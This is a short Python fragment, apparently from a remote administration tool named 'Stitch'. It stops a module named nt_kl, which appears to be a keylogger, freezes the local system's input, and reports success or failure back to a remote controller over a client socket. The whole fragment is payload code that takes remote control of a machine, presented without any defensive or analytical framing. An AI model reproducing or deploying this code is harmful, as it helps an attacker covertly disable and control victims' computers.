# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

nt_kl.stop()
status = nt_kl.get_frz_status()
if status:
    resp = '[+] System is already frozen\n'
else:
    nt_kl.start_freeze()
    status = nt_kl.get_frz_status()
    if status:
        resp = '[+] System is now frozen\n'
    else:
        resp = '[!] System failed to freeze\n'

send(client_socket,resp)
